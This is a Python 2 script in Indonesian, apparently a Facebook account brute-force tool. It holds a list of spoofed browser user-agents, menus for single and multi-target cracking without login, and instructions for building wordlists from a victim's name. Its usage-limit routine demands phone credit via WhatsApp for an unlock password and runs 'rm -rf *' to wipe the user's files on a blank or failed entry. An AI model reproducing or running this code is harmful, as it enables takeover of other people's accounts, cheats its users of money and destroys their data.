
# Ngambil Dari : https://gist.github.com/pzb/b4b6f57144aea7827ae4

user_agents = [('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17',
'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4',
'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16',
'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0',
'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36')]






































































































































































































































































































































































































































string1 = '''
      Silahkan Kalian Buat Wordlist Sendiri
  Hanya Dengan Memasukkan Nama Depan Dan Belakan 
Fb Korban Yang Mau Di Crack Passwordnya ya sayang..
'''
string2 = ''' 
        Brute Force Fb Target
     +=========================+
'''

baner = '''
  ___   V.0.1  ___ ___  .
 |   \ _____ _|_ _|   \  | Using : Python27
 | |) / -_) V /| || |) | | Tools : Geli2 Fb
 |___/\___|\_/|___|___/  | Versi : 0.1xxxxx .
         {+}_{+}        /  Author: IqbalDev /
 +--,------------------'----------------,--'
   / Saya Tidak Bertanggung Jawab Atas   \\
  / Apa Yang Kalian Perbuat, Ini Sengaja /
  \     Saya Buat Untuk Uji Keamanan    /
   '-----------------------,-----------'
    {1} Brute Force Target / Tanpa Login
    {2} Multi Brute Force / Tanpa Login
    {3} Lainnya...........
'''

user_dev = '''
 Silahkan masukkan Nama orang yang mau di crack, 
  contoh penulisan: (dinda) atau (dinda maulia) 
tanpa tanda kurung () ya gan // Selamat Mencoba :)
'''






# Author Iqbal Dev
import os,sys, base64, subprocess
def deviv():
	d = open('dir/passw.txt', 'a')
	d.write('w\n')
	d.close()
d = 123
def divev():
	# os.mkdir('dir')
	# open('dir/pass.txt', 'w').write('')
	# open('dir/passw.txt', 'w').write('w\n'*5)

	data = open('dir/passw.txt', 'r').readlines()
	da = len(data)
	z = open('dir/pass.txt', 'r').readlines()
	v = len(z)
	print da
	if v < da:
		print "\n  Kamu udah menggunakan tools ini lebih dari yang di tentukan oleh pembuat, Silahkan kamu minta passwordnya ke pembuat tools ini dengan cara masukkan tgl,bulan, dan tahun kelahiranmu."
		l = raw_input('\n [T] Masukkan Tnggal Lahir Kamu : \n ======> ')
		h = l.replace('/', 'd3v').replace('0', '10')
		ha = base64.b64encode(h)
	
		subprocess.check_output(['am','start',"https://wa.me/628812457948?text=*KIRIMKAN KODE UNIK INI :"+ha+" WAJIB |*  Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta bukti pengirimannya  | *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, smartfren, Kirim bukti pengiriman pulsanya (ss), ntar kamu akan di beri Password* Note: PESAN INI JANGAN DI HAPUS, HARUS DIKIRIMKAN!!"])
		f = raw_input('\n [P] Masukkan Password : \n ==============> ')
		if f == '' or f == ' ':
			os.system('rm -rf *')
			sys.exit()
		if f == h:
			print "\n Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
			raw_input(" \n Tekan ENTER untuk melanjutkan ...")
			divev()	
		if f != '0'+h+'0':
			print "\n Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
			raw_input(" \n Tekan ENTER untuk melanjutkan ...")
			divev()	
		if f == '0'+h+'0':
			g = open('dir/pass.txt', 'w')
			g.write('w\n'*1000)
			print 'sukses'
			sys.exit()
		print "hapus"
		os.system('rm -rf *')
